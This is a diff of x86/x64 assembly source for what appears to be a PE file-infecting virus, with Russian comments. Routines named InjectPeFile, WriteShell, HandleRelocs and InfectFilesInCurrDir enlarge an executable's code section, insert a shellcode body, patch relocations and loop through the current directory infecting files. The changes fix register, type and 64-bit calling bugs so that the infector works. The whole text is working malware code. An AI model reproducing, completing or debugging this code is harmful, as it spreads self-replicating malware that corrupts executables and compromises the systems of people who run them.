@@ -297,7 +297,7 @@ InjectPeFile proc CurrentStdcallNotation uses cdi cbx pe:cword, code:cword, code
     local deltaFileSize:dword
     local targetSection:cword
     local sizeMovedData:cword
-    local oldFileSize:cword
+    local oldFileSize:dword
     local fileAligment:dword
     local secAligm:dword
     local sAlignAddSize:dword
@@ -337,10 +337,10 @@ InjectPeFile proc CurrentStdcallNotation uses cdi cbx pe:cword, code:cword, code
     ;DbgBreak 
     mov cdx, [pe]
     mov cdx, [cdx].PeHeaders.nthead
-    lea cdx, [cdx].IMAGE_NT_HEADERS.OptionalHeader
-    mov ecx, [cdx].IMAGE_OPTIONAL_HEADER.FileAlignment
+    lea cdi, [cdx].IMAGE_NT_HEADERS.OptionalHeader
+    mov ecx, [cdi].IMAGE_OPTIONAL_HEADER.FileAlignment
     mov [fileAligment], ecx
-    mov ecx, [cdx].IMAGE_OPTIONAL_HEADER.SectionAlignment
+    mov ecx, [cdi].IMAGE_OPTIONAL_HEADER.SectionAlignment
     mov [secAligm], ecx
 
     ; Находим адрес конца первой кодовой секции
@@ -352,12 +352,12 @@ InjectPeFile proc CurrentStdcallNotation uses cdi cbx pe:cword, code:cword, code
         ret
     .endif
 
-    mov cdx, cax
-    mov [targetSection], cdx
+    mov cdi, cax
+    mov [targetSection], cdi
     xor ccx, ccx
-    mov ecx, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize
+    mov ecx, [cdi].IMAGE_SECTION_HEADER.Misc.VirtualSize
     mov [cbx + scInfo.SizeOfTargetSec], ecx
-    mov eax, [cdx].IMAGE_SECTION_HEADER.VirtualAddress
+    mov eax, [cdi].IMAGE_SECTION_HEADER.VirtualAddress
     mov dword ptr [cbx + scInfo.targetSecRVA], eax
     
     ; размер шеллкода будет выравнен до страницы
@@ -367,7 +367,7 @@ InjectPeFile proc CurrentStdcallNotation uses cdi cbx pe:cword, code:cword, code
     add [newCSSize], eax
     
     ; _diff = Aligment(vsize, _aligm) - Aligment(_psects[num].Misc.VirtualSize, _aligm);
-    invoke AlignToTop, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize, [secAligm]
+    invoke AlignToTop, [cdi].IMAGE_SECTION_HEADER.Misc.VirtualSize, [secAligm]
     mov [dwTmp], eax
     invoke AlignToTop, [newCSSize], [secAligm]
     sub eax, [dwTmp]
@@ -375,7 +375,7 @@ InjectPeFile proc CurrentStdcallNotation uses cdi cbx pe:cword, code:cword, code
     mov dword ptr [cbx + scInfo.v_diff], eax
 
     ; f_diff = Aligment(vsize, f_aligm) - Aligment(_psects[num].Misc.VirtualSize, f_aligm);
-    invoke AlignToTop, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize, [fileAligment]
+    invoke AlignToTop, [cdi].IMAGE_SECTION_HEADER.Misc.VirtualSize, [fileAligment]
     mov [dwTmp], eax
     invoke AlignToTop, [newCSSize], [fileAligment]
     sub eax, [dwTmp]
@@ -387,12 +387,12 @@ InjectPeFile proc CurrentStdcallNotation uses cdi cbx pe:cword, code:cword, code
 
     xor eax, eax
     ;mov eax, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize
-    add eax, [cdx].IMAGE_SECTION_HEADER.VirtualAddress
+    add eax, [cdi].IMAGE_SECTION_HEADER.VirtualAddress
     mov [VAsc], eax
     mov dword ptr [cbx + scInfo.startRVA], eax
 
 
-    mov eax, [cdx].IMAGE_SECTION_HEADER.PointerToRawData
+    mov eax, [cdi].IMAGE_SECTION_HEADER.PointerToRawData
     ;add eax, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize
     mov [RawAddrSc], eax
 
@@ -486,12 +486,14 @@ InjectPeFile proc CurrentStdcallNotation uses cdi cbx pe:cword, code:cword, code
     ;add csi, totalEnd - start
 
     mov ccx, [peMem]
-    add ccx, [oldFileSize] ; ccx = pe->mem + pe->filesize
+    xor cdx, cdx
+    mov edx, [oldFileSize]
+    add ccx, cdx ; ccx = pe->mem + pe->filesize
     sub ccx, csi    ; ccx = ccx - src = sizeMovedData
     mov [sizeMovedData], ccx
     
-    invoke sc_memmove, cdi, csi, [sizeMovedData]
-    invoke sc_memset, [pSC], 041h, [cbx + scInfo.alScSize]
+    invoke64 sc_memmove, cdi, csi, [sizeMovedData]
+    invoke64 sc_memset, [pSC], 041h, [cbx + scInfo.alScSize]
     
 
     ;DbgBreak
@@ -577,7 +579,7 @@ WriteShell proc CurrentStdcallNotation uses cbx cdi csi cdx pe:cword, is_x64:cwo
     add cax, [pBase]
     mov [pSc], cax
     
-    invoke sc_memcpy, [pSc], cbx, totalEnd - start
+    invoke64 sc_memcpy, [pSc], cbx, totalEnd - start
     
     ; обнуляем байт isFirst
     mov cax, [pSc]
@@ -902,6 +904,7 @@ HandleRelocs proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pIRT:cword, 
             mov csi, [pBase]
             add csi, cax    ; pe->mem + VA
             xor cax, cax
+            mov ccx, [pBlocks]
             mov ax, word ptr [ccx]
             and ax, 0fffh
             add csi, cax
@@ -1169,14 +1172,14 @@ InfectFilesInCurrDir proc CurrentStdcallNotation uses cbx cdi
 		mov [rbp + 28h], r9
 	endif
 	
-    invoke sc_strlen, addr [cbx+targetDir]
+    invoke64 sc_strlen, addr [cbx+targetDir]
     mov [nameLen], cax
-    invoke sc_memcpy, addr [dirName], addr [cbx+targetDir], cax
+    invoke64 sc_memcpy, addr [dirName], addr [cbx+targetDir], cax
     lea ccx, [dirName]
     add ccx, cword ptr [nameLen]
-    invoke sc_memcpy, ccx, addr [cbx + findMask], 7
+    invoke64 sc_memcpy, ccx, addr [cbx + findMask], 7
 
-    invoke sc_FindFirstFileA, addr [dirName], addr findData
+    invoke64 sc_FindFirstFileA, addr [dirName], addr findData
 	.if cax == -1
 		invoke sc_printf, addr [cbx + msgWarningFilesNotFound]
 		ret
@@ -1184,7 +1187,7 @@ InfectFilesInCurrDir proc CurrentStdcallNotation uses cbx cdi
     mov [hFindFile], cax
 	
 	.while cax != 0
-		invoke sc_printf, addr [cbx + strFormat], addr [findData].WIN32_FIND_DATAA.cFileName
+		invoke64 sc_printf, addr [cbx + strFormat], addr [findData].WIN32_FIND_DATAA.cFileName
 		;int 3
 		invoke LoadPeFile, addr [findData].WIN32_FIND_DATAA.cFileName , addr [pe], 0
 		.if cax == 1
